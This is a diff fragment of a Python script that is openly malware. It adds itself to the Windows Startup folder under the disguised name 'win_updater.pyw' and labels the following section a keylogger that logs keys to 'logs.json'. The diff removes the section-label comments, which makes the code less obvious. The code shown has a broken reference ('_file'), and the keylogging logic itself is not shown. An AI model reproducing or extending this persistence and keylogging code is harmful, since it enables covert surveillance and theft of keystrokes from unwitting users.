@@ -10,7 +10,7 @@ from pathlib import Path
 # -------------- ADD TO STARTUP SECTION --------------
 def add_to_startup():
     startup_dir = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
-    script_path = os.path.realpath(_file)  # ✅ Corrected __file
+    script_path = os.path.realpath(_file) 
     target_path = os.path.join(startup_dir, "win_updater.pyw")  # disguise the name
 
     if not os.path.exists(target_path):
@@ -20,10 +20,7 @@ def add_to_startup():
         print("[=] Already in startup.")
 
 add_to_startup()
-# -------------- END OF STARTUP SECTION --------------
 
-
-# -------------- KEYLOGGER SECTION --------------
 key_list = []
 x = False
 log_file = 'logs.json'
